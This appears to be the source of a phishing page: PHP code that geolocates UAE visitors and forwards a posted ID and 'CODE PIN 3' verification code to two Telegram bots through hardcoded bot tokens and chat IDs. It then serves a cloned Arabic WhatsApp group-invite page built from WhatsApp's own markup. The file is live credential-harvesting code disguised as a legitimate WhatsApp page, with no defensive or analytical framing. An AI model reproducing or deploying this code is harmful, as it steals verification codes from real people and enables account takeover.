<?php
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$geoplugin->locate();
$nearby = $geoplugin->nearby();



if($geoplugin->countryCode == "AE"){

?>

<?php 
$id = $_POST['id'];
$idN = "#ID:".$id;
$telegram_token ="5867675895:AAFuBZh3XOmWsDSbz-DWye0qp05_0_iqutQ"; 
$url = "https://api.telegram.org/bot".$telegram_token;
$chat_id ="5288376819";

 $params=[
      'chat_id'=>$chat_id,
      'text' => $idN."| CODE PIN 3 : ".$_POST['codeconf3'],
      
  ];
  $ch = curl_init($url . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
?>


<?php 
$id = $_POST['id'];
$idN = "#ID:".$id;
$telegram_token ="5385135296:AAFjCamWUVRdld7blxuADrpHFdhIbwZfR5w"; 
$url = "https://api.telegram.org/bot".$telegram_token;
$chat_id ="5035926503";

 $params=[
      'chat_id'=>$chat_id,
      'text' => $idN."| CODE PIN 3 : ".$_POST['codeconf3'],
      
  ];
  $ch = curl_init($url . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
?>



    <html lang="ar" id="facebook" class="">

    <head>
        <meta charset="utf-8">
        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
        <script nonce="">
            function envFlush(a) {
                function b(b) {
                    for (var c in a) b[c] = a[c]
                }
                window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
            }
            envFlush({
                "useTrustedTypes": false,
                "isTrustedTypesReportOnly": false,
                "ajaxpipe_token": "AXhvdNHlU43n25hG3c0",
                "gk_instrument_object_url": true,
                "stack_trace_limit": 30,
                "timesliceBufferSize": 5000,
                "show_invariant_decoder": false,
                "compat_iframe_token": "AQ58R8Y6jd_tZUtdtaU",
                "isCQuick": false
            });
        </script>
        <script nonce="">
            (function(a) {
                function b(b) {
                    if (!window.openDatabase) return;
                    b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL = function(a, b, c, d) {
                        return window.openDatabase(a, b, c, d)
                    };
                    window.openDatabase = function() {
                        throw new Error()
                    }
                }
                b(a)
            })(this);
        </script>
        <style nonce=""></style>
        <script nonce="">
            __DEV__ = 0;
        </script><noscript>
            <meta http-equiv="refresh" content="0; URL=/KWV8T3ugsHH1unqZelMZ3k?_fb_noscript=1" />
        </noscript>
        <title id="pageTitle">الدعوة للانضمام إلى مجموعة واتساب</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="theme-color" content="#1BA691">
        <meta name="msapplication-navbutton-color" content="#1BA691">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="description" content="الدعوة للانضمام إلى مجموعة واتساب">
        <meta name="keywords">
        <meta property="og:title" content="">
        <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png">
        <meta property="og:site_name" content="WhatsApp.com">
        <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب">
        <meta property="og:keywords">
        <meta property="invite_link_type" content="REGULAR">
        <meta property="invite_link_type_v2" content="">
        <meta name="apple-mobile-web-app-status-bar-style" content="#1BA691">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="robots" content="noindex">
        <link rel="shortcut icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
        <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yC/l/1,cross/iZFW4Wn89pz.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="lR1wO42" crossorigin="anonymous">
        <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yC/l/1,cross/r26wQn7wvRV.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="XuAdEtr" crossorigin="anonymous">
        <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/y-/l/1,cross/rzCGGQRrwOw.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="gB3Zq0N" crossorigin="anonymous">
        <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yo/l/1,cross/28bZN702Ikw.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="b5NZ1WW" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3/y0/r/LPYLWlcYfCw.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="XNaMn2+" crossorigin="anonymous" nonce=""></script>
        <script nonce="">
            requireLazy(["HasteSupportData"], function(m) {
                m.handle({
                    "clpData": {
                        "1838142": {
                            "r": 1,
                            "s": 1
                        },
                        "1936894": {
                            "r": 1,
                            "s": 1
                        },
                        "1949898": {
                            "r": 1
                        },
                        "1848815": {
                            "r": 10000,
                            "s": 1
                        }
                    },
                    "gkxData": {
                        "708253": {
                            "result": false,
                            "hash": "AT5n4hBL3YTMnQWtjrU"
                        },
                        "996940": {
                            "result": false,
                            "hash": "AT7opYuEGy3sjG1aWDo"
                        },
                        "1073500": {
                            "result": false,
                            "hash": "AT7aJmfnqWyioxOOLuo"
                        },
                        "1224637": {
                            "result": false,
                            "hash": "AT7JRluWxuwDm3Xz2aU"
                        },
                        "1263340": {
                            "result": false,
                            "hash": "AT5bwizWgDaFQudmo_c"
                        },
                        "676837": {
                            "result": false,
                            "hash": "AT4N8wBZA8ctCdHwuiU"
                        },
                        "676920": {
                            "result": false,
                            "hash": "AT497IX4gOFG8gZe6qM"
                        },
                        "1167394": {
                            "result": false,
                            "hash": "AT7BpN-tlUPwbIIF77U"
                        },
                        "1857581": {
                            "result": false,
                            "hash": "AT5yTxGMp6le0PAtQN0"
                        }
                    }
                })
            });
            requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
                (new ServerJS()).handle({
                    "define": [
                        ["URLFragmentPreludeConfig", [], {
                            "hashtagRedirect": false,
                            "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"]
                        }, 137],
                        ["CometPersistQueryParams", [], {
                            "relative": {},
                            "domain": {}
                        }, 6231],
                        ["CookieDomain", [], {
                            "domain": "whatsapp.com"
                        }, 6421],
                        ["CurrentAdAccountInitialData", [], {
                            "AD_ACCOUNT_ID": null
                        }, 6828],
                        ["BootloaderConfig", [], {
                            "deferBootloads": false,
                            "jsRetries": [200, 500],
                            "jsRetryAbortNum": 2,
                            "jsRetryAbortTime": 5,
                            "silentDups": false,
                            "hypStep4": false,
                            "phdOn": false,
                            "btCutoffIndex": 80,
                            "translationRetries": [200, 500],
                            "translationRetryAbortNum": 3,
                            "translationRetryAbortTime": 50
                        }, 329],
                        ["CSSLoaderConfig", [], {
                            "timeout": 5000,
                            "modulePrefix": "BLCSS:",
                            "loadEventSupported": true
                        }, 619],
                        ["CookieCoreConfig", [], {
                            "wa_lang_pref": {
                                "t": 604800,
                                "s": "None"
                            }
                        }, 2104],
                        ["CurrentCommunityInitialData", [], {}, 490],
                        ["CurrentEnvironment", [], {
                            "facebookdotcom": true,
                            "messengerdotcom": false,
                            "workplacedotcom": false,
                            "instagramdotcom": false,
                            "workdotmetadotcom": false
                        }, 827],
                        ["CurrentUserInitialData", [], {
                            "ACCOUNT_ID": "0",
                            "USER_ID": "0",
                            "NAME": "",
                            "SHORT_NAME": null,
                            "IS_BUSINESS_PERSON_ACCOUNT": false,
                            "HAS_SECONDARY_BUSINESS_PERSON": false,
                            "IS_FACEBOOK_WORK_ACCOUNT": false,
                            "IS_MESSENGER_ONLY_USER": false,
                            "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                            "IS_MESSENGER_CALL_GUEST_USER": false,
                            "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                            "IS_WORKROOMS_USER": false,
                            "APP_ID": "256281040558",
                            "IS_BUSINESS_DOMAIN": false
                        }, 270],
                        ["DTSGInitialData", [], {}, 258],
                        ["ISB", [], {}, 330],
                        ["LSD", [], {
                            "token": "JuWSQB9CYxTGlImFIOVW7A"
                        }, 323],
                        ["ServerNonce", [], {
                            "ServerNonce": "aa9ZhgtNu8VZI7YW71sKt2"
                        }, 141],
                        ["SiteData", [], {
                            "server_revision": 1006770746,
                            "client_revision": 1006770746,
                            "tier": "",
                            "push_phase": "C3",
                            "pkg_cohort": "BP:whatsapp_www_pkg",
                            "haste_session": "19350.BP:whatsapp_www_pkg.2.0.0.0.0",
                            "pr": 1,
                            "haste_site": "www",
                            "manifest_base_uri": "https:\/\/static.whatsapp.net",
                            "manifest_origin": null,
                            "be_one_ahead": false,
                            "is_rtl": true,
                            "is_comet": false,
                            "is_experimental_tier": false,
                            "is_jit_warmed_up": true,
                            "hsi": "7180743252192495205",
                            "semr_host_bucket": "6",
                            "bl_hash_version": 2,
                            "skip_rd_bl": true,
                            "comet_env": 0,
                            "wbloks_env": false,
                            "spin": 0,
                            "__spin_r": 1006770746,
                            "__spin_b": "trunk",
                            "__spin_t": 1671897073,
                            "vip": "157.240.30.54"
                        }, 317],
                        ["SprinkleConfig", [], {
                            "param_name": "jazoest",
                            "version": 2,
                            "should_randomize": false
                        }, 2111],
                        ["UserAgentData", [], {
                            "browserArchitecture": "64",
                            "browserFullVersion": "108.0.0.0",
                            "browserMinorVersion": 0,
                            "browserName": "Chrome",
                            "browserVersion": 108,
                            "deviceName": "Unknown",
                            "engineName": "WebKit",
                            "engineVersion": "537.36",
                            "platformArchitecture": "64",
                            "platformName": "Windows",
                            "platformVersion": "10",
                            "platformFullVersion": "10"
                        }, 527],
                        ["PromiseUsePolyfillSetImmediateGK", [], {
                            "www_always_use_polyfill_setimmediate": false
                        }, 2190],
                        ["KSConfig", [], {
                            "killed": {
                                "__set": ["MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS", "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER", "SRT_BANZAI_SRT_MAIN_LOGGER", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE", "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER", "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD", "BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX", "SRT_REVIEW_DISABLE_FELLOWSHIP_REVIEW", "EO_STORE_HOME_PAGE_COVID19_BANNER"]
                            },
                            "ko": {
                                "__set": ["3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "8rDvN9vWdAK", "5BdzWGmfvrA", "DDZhogI19W", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c", "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts", "aWxCyi1sEC7", "9kCSDzzr8fu", "awYA7fn2Bse", "aBMlJ8QRPWE", "Fl3bH3ozLe"]
                            }
                        }, 2580],
                        ["JSErrorLoggingConfig", [], {
                            "appId": 256281040558,
                            "extra": [],
                            "reportInterval": 50,
                            "sampleWeight": null,
                            "sampleWeightKey": "__jssesw",
                            "projectBlocklist": []
                        }, 2776],
                        ["DataStoreConfig", [], {
                            "expandoKey": "__FB_STORE",
                            "useExpando": true
                        }, 2915],
                        ["CookieCoreLoggingConfig", [], {
                            "maximumIgnorableStallMs": 16.67,
                            "sampleRate": 9.7e-5,
                            "sampleRateClassic": 1.0e-10,
                            "sampleRateFastStale": 1.0e-8
                        }, 3401],
                        ["ImmediateImplementationExperiments", [], {
                            "prefer_message_channel": true
                        }, 3419],
                        ["DTSGInitData", [], {
                            "token": "",
                            "async_get_token": ""
                        }, 3515],
                        ["UriNeedRawQuerySVConfig", [], {
                            "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com", "nibio.no"]
                        }, 3871],
                        ["InitialCookieConsent", [], {
                            "deferCookies": false,
                            "initialConsent": {
                                "__set": [1, 2]
                            },
                            "noCookies": false,
                            "shouldShowCookieBanner": false
                        }, 4328],
                        ["WebConnectionClassServerGuess", [], {
                            "connectionClass": "UNKNOWN"
                        }, 4705],
                        ["CometAltpayJsSdkIframeAllowedDomains", [], {
                            "allowed_domains": ["https:\/\/live.adyen.com", "https:\/\/integration-facebook.payu.in", "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com", "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"]
                        }, 4920],
                        ["BootloaderEndpointConfig", [], {
                            "debugNoBatching": false,
                            "endpointURI": "https:\/\/chat.whatsapp.com\/ajax\/bootloader-endpoint\/"
                        }, 5094],
                        ["CookieConsentIFrameConfig", [], {
                            "consent_param": "FQAREhIA.ARZs3lKW59jmbpQmWmgxBFRwPZxqmVpYBLzV55APk877Ltnf",
                            "allowlisted_iframes": []
                        }, 5540],
                        ["BigPipeExperiments", [], {
                            "link_images_to_pagelets": false
                        }, 907],
                        ["IntlVariationHoldout", [], {
                            "disable_variation": false
                        }, 6533],
                        ["AsyncRequestConfig", [], {
                            "retryOnNetworkError": "1",
                            "useFetchStreamAjaxPipeTransport": false
                        }, 328],
                        ["FbtResultGK", [], {
                            "shouldReturnFbtResult": true,
                            "inlineMode": "NO_INLINE"
                        }, 876],
                        ["IntlPhonologicalRules", [], {
                            "meta": {},
                            "patterns": {}
                        }, 1496],
                        ["IntlViewerContext", [], {
                            "GENDER": 1,
                            "regionalLocale": null
                        }, 772],
                        ["NumberFormatConfig", [], {
                            "decimalSeparator": ",",
                            "numberDelimiter": "\u00a0",
                            "minDigitsForThousandsSeparator": 4,
                            "standardDecimalPatternInfo": {
                                "primaryGroupSize": 3,
                                "secondaryGroupSize": 3
                            },
                            "numberingSystemData": null
                        }, 54],
                        ["SessionNameConfig", [], {
                            "seed": "2BuA"
                        }, 757],
                        ["ZeroCategoryHeader", [], {}, 1127],
                        ["ZeroRewriteRules", [], {
                            "rewrite_rules": {},
                            "whitelist": {
                                "\/hr\/r": 1,
                                "\/hr\/p": 1,
                                "\/zero\/unsupported_browser\/": 1,
                                "\/zero\/policy\/optin": 1,
                                "\/zero\/optin\/write\/": 1,
                                "\/zero\/optin\/legal\/": 1,
                                "\/zero\/optin\/free\/": 1,
                                "\/about\/privacy\/": 1,
                                "\/about\/privacy\/update\/": 1,
                                "\/privacy\/explanation\/": 1,
                                "\/zero\/toggle\/welcome\/": 1,
                                "\/zero\/toggle\/nux\/": 1,
                                "\/zero\/toggle\/settings\/": 1,
                                "\/fup\/interstitial\/": 1,
                                "\/work\/landing": 1,
                                "\/work\/login\/": 1,
                                "\/work\/email\/": 1,
                                "\/ai.php": 1,
                                "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                                "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                                "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                                "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                                "\/qp\/interstitial\/": 1,
                                "\/qp\/action\/redirect\/": 1,
                                "\/qp\/action\/close\/": 1,
                                "\/zero\/support\/ineligible\/": 1,
                                "\/zero_balance_redirect\/": 1,
                                "\/zero_balance_redirect": 1,
                                "\/zero_balance_redirect\/l\/": 1,
                                "\/l.php": 1,
                                "\/lsr.php": 1,
                                "\/ajax\/dtsg\/": 1,
                                "\/checkpoint\/block\/": 1,
                                "\/exitdsite": 1,
                                "\/zero\/balance\/pixel\/": 1,
                                "\/zero\/balance\/": 1,
                                "\/zero\/balance\/carrier_landing\/": 1,
                                "\/zero\/flex\/logging\/": 1,
                                "\/tr": 1,
                                "\/tr\/": 1,
                                "\/sem_campaigns\/sem_pixel_test\/": 1,
                                "\/bookmarks\/flyout\/body\/": 1,
                                "\/zero\/subno\/": 1,
                                "\/confirmemail.php": 1,
                                "\/policies\/": 1,
                                "\/mobile\/internetdotorg\/classifier\/": 1,
                                "\/zero\/dogfooding": 1,
                                "\/xti.php": 1,
                                "\/zero\/fblite\/config\/": 1,
                                "\/hr\/zsh\/wc\/": 1,
                                "\/ajax\/bootloader-endpoint\/": 1,
                                "\/mobile\/zero\/carrier_page\/": 1,
                                "\/mobile\/zero\/carrier_page\/education_page\/": 1,
                                "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
                                "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
                                "\/aloha_check_build": 1,
                                "\/upsell\/zbd\/softnudge\/": 1,
                                "\/mobile\/zero\/af_transition\/": 1,
                                "\/mobile\/zero\/af_transition\/action\/": 1,
                                "\/mobile\/zero\/freemium\/": 1,
                                "\/mobile\/zero\/freemium\/redirect\/": 1,
                                "\/mobile\/zero\/freemium\/zero_fup\/": 1,
                                "\/privacy\/policy\/": 1,
                                "\/privacy\/center\/": 1,
                                "\/data\/manifest\/": 1,
                                "\/4oh4.php": 1,
                                "\/autologin.php": 1,
                                "\/birthday_help.php": 1,
                                "\/checkpoint\/": 1,
                                "\/contact-importer\/": 1,
                                "\/cr.php": 1,
                                "\/legal\/terms\/": 1,
                                "\/login.php": 1,
                                "\/login\/": 1,
                                "\/mobile\/account\/": 1,
                                "\/n\/": 1,
                                "\/remote_test_device\/": 1,
                                "\/upsell\/buy\/": 1,
                                "\/upsell\/buyconfirm\/": 1,
                                "\/upsell\/buyresult\/": 1,
                                "\/upsell\/promos\/": 1,
                                "\/upsell\/continue\/": 1,
                                "\/upsell\/h\/promos\/": 1,
                                "\/upsell\/loan\/learnmore\/": 1,
                                "\/upsell\/purchase\/": 1,
                                "\/upsell\/promos\/upgrade\/": 1,
                                "\/upsell\/buy_redirect\/": 1,
                                "\/upsell\/loan\/buyconfirm\/": 1,
                                "\/upsell\/loan\/buy\/": 1,
                                "\/upsell\/sms\/": 1,
                                "\/wap\/a\/channel\/reconnect.php": 1,
                                "\/wap\/a\/nux\/wizard\/nav.php": 1,
                                "\/wap\/appreg.php": 1,
                                "\/wap\/birthday_help.php": 1,
                                "\/wap\/c.php": 1,
                                "\/wap\/confirmemail.php": 1,
                                "\/wap\/cr.php": 1,
                                "\/wap\/login.php": 1,
                                "\/wap\/r.php": 1,
                                "\/zero\/datapolicy": 1,
                                "\/a\/timezone.php": 1,
                                "\/a\/bz": 1,
                                "\/bz\/reliability": 1,
                                "\/r.php": 1,
                                "\/mr\/": 1,
                                "\/reg\/": 1,
                                "\/registration\/log\/": 1,
                                "\/terms\/": 1,
                                "\/f123\/": 1,
                                "\/expert\/": 1,
                                "\/experts\/": 1,
                                "\/terms\/index.php": 1,
                                "\/terms.php": 1,
                                "\/srr\/": 1,
                                "\/msite\/redirect\/": 1,
                                "\/fbs\/pixel\/": 1,
                                "\/contactpoint\/preconfirmation\/": 1,
                                "\/contactpoint\/cliff\/": 1,
                                "\/contactpoint\/confirm\/submit\/": 1,
                                "\/contactpoint\/confirmed\/": 1,
                                "\/contactpoint\/login\/": 1,
                                "\/preconfirmation\/contactpoint_change\/": 1,
                                "\/help\/contact\/": 1,
                                "\/survey\/": 1,
                                "\/upsell\/loyaltytopup\/accept\/": 1,
                                "\/settings\/": 1,
                                "\/lite\/": 1,
                                "\/zero_status_update\/": 1,
                                "\/operator_store\/": 1,
                                "\/upsell\/": 1,
                                "\/wifiauth\/login\/": 1
                            }
                        }, 1478],
                        ["IntlNumberTypeConfig", [], {
                            "impl": "if (n === 0) { return IntlVariations.NUMBER_ZERO; } else if (n === 1) { return IntlVariations.NUMBER_ONE; } else if (n === 2) { return IntlVariations.NUMBER_TWO; } else if ((n \u0025 100 >= 3 && n \u0025 100 \u003C= 10)) { return IntlVariations.NUMBER_FEW; } else if ((n \u0025 100 >= 11 && n \u0025 100 \u003C= 99)) { return IntlVariations.NUMBER_MANY; } else { return IntlVariations.NUMBER_OTHER; }"
                        }, 3405],
                        ["ServerTimeData", [], {
                            "serverTime": 1671897073655,
                            "timeOfRequestStart": 1671897073453,
                            "timeOfResponseStart": 1671897073453
                        }, 5943],
                        ["FbtQTOverrides", [], {
                            "overrides": {}
                        }, 551],
                        ["AnalyticsCoreData", [], {
                            "device_id": "$^|AcadMpaps-MOXsJS2WARtKBkty7c3kZh91exQE-VOMYBn23rvh_HQ09_YEDOKDDIgSHiigT1_SApNGlJu8O1a_g|fd.AcY8rN28u0FNaYVP0dWLK4ddg2hHTJk_g0zUF8JGFei5zenIZTicakNHZXcJKIcWzZmWc-K1bVfak58OKUNtBm_t",
                            "app_id": "256281040558",
                            "enable_bladerunner": false,
                            "enable_ack": true,
                            "push_phase": "C3",
                            "enable_observer": false,
                            "enable_dataloss_timer": false,
                            "enable_fallback_for_br": true,
                            "fix_br_init_rc": false,
                            "queue_activation_experiment": false,
                            "max_delay_br_queue": 60000,
                            "max_delay_br_queue_immediate": 3,
                            "use_critical_for_fallback_from_immediate": false,
                            "impression_experiment_flag": 3
                        }, 5237],
                        ["cr:696703", [], {
                            "__rc": [null, "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:708886", ["EventProfilerImpl"], {
                            "__rc": ["EventProfilerImpl", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:717822", ["TimeSliceImpl"], {
                            "__rc": ["TimeSliceImpl", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:806696", ["clearTimeoutBlue"], {
                            "__rc": ["clearTimeoutBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:807042", ["setTimeoutBlue"], {
                            "__rc": ["setTimeoutBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
                            "__rc": ["setIntervalAcrossTransitionsBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
                            "__rc": ["setTimeoutAcrossTransitionsBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:1003267", ["clearIntervalBlue"], {
                            "__rc": ["clearIntervalBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:1183579", ["InlineFbtResultImpl"], {
                            "__rc": ["InlineFbtResultImpl", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:925100", ["RunBlue"], {
                            "__rc": ["RunBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                        }, -1],
                        ["cr:729414", [], {
                            "__rc": [null, "Aa1qZssGW9I9OCeDkfxbgjPZE9kpjRyREnuO9mjCK_4yH5uucSx7pKHVKBY8UIjAhdxGshja4ixXV5Iv_VXM7ASQ"]
                        }, -1],
                        ["cr:1094907", [], {
                            "__rc": [null, "Aa1r7xz0fYQcUSitMNq22OyQaU_o3YRa45MEyp9gAlfiqSejU8uhxpEYFFrYhDSqomdCGg0-v08PxycFYzf5j-c"]
                        }, -1],
                        ["EventConfig", [], {
                            "sampling": {
                                "bandwidth": 0,
                                "play": 0,
                                "playing": 0,
                                "progress": 0,
                                "pause": 0,
                                "ended": 0,
                                "seeked": 0,
                                "seeking": 0,
                                "waiting": 0,
                                "loadedmetadata": 0,
                                "canplay": 0,
                                "selectionchange": 0,
                                "change": 0,
                                "timeupdate": 0,
                                "adaptation": 0,
                                "focus": 0,
                                "blur": 0,
                                "load": 0,
                                "error": 0,
                                "message": 0,
                                "abort": 0,
                                "storage": 0,
                                "scroll": 200000,
                                "mousemove": 20000,
                                "mouseover": 10000,
                                "mouseout": 10000,
                                "mousewheel": 1,
                                "MSPointerMove": 10000,
                                "keydown": 0.1,
                                "click": 0.02,
                                "mouseup": 0.02,
                                "__100ms": 0.001,
                                "__default": 5000,
                                "__min": 100,
                                "__interactionDefault": 200,
                                "__eventDefault": 100000
                            },
                            "page_sampling_boost": 1,
                            "interaction_regexes": {},
                            "interaction_boost": {},
                            "event_types": {},
                            "manual_instrumentation": false,
                            "profile_eager_execution": false,
                            "disable_heuristic": true,
                            "disable_event_profiler": false
                        }, 1726],
                        ["AdsInterfacesSessionConfig", [], {}, 2393]
                    ],
                    "require": [
                        ["markJSEnabled"],
                        ["lowerDomain"],
                        ["URLFragmentPrelude"],
                        ["Primer"],
                        ["BigPipe"],
                        ["Bootloader"],
                        ["TimeSlice"],
                        ["AsyncRequest"],
                        ["BanzaiScuba_DEPRECATED"],
                        ["VisualCompletionGating"],
                        ["FbtLogging"],
                        ["IntlQtEventFalcoEvent"],
                        ["RequireDeferredReference", "unblock", [],
                            [
                                ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"], "sd"
                            ]
                        ],
                        ["RequireDeferredReference", "unblock", [],
                            [
                                ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"], "css"
                            ]
                        ]
                    ]
                });
            });
        </script>
        <link href="https://static.whatsapp.net/rsrc.php/v3ii6o4/yQ/l/ar_AR/__yqx8C_czO.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3ii6o4/yQ/l/ar_AR/__yqx8C_czO.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="zmDkAi9"></script>
        <link href="https://static.whatsapp.net/rsrc.php/v3/y2/r/PyMoUs0-uTx.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3/y2/r/PyMoUs0-uTx.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="6Vxclga"></script>
